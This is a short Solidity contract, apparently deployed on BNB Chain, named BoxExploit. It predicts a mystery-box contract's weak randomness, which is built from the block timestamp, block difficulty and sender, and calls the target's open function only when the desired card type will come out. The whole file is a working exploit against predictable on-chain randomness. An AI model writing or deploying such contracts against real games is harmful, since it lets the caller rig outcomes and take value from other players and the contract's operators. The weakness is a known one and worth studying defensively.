/**
 *Submitted for verification at BscScan.com on 2022-01-01
*/

pragma solidity 0.8.11;

contract BoxExploit {

    function _randModulus(uint mod) internal view returns (uint) {
        uint rand = uint(keccak256(abi.encodePacked(
                block.timestamp,
                block.difficulty,
                msg.sender)
            )) % mod;
        return rand;
    }

    function callOpen(address mysteryBoxContractAddress, uint boxToOpen, uint nbCardTypes, uint cardTypeIdx) external {
        require(_randModulus(nbCardTypes) == cardTypeIdx);
        bytes memory payload = abi.encodeWithSignature("open(uint256)", boxToOpen);
        (bool success, bytes memory returnData) = mysteryBoxContractAddress.call(payload);
    }
}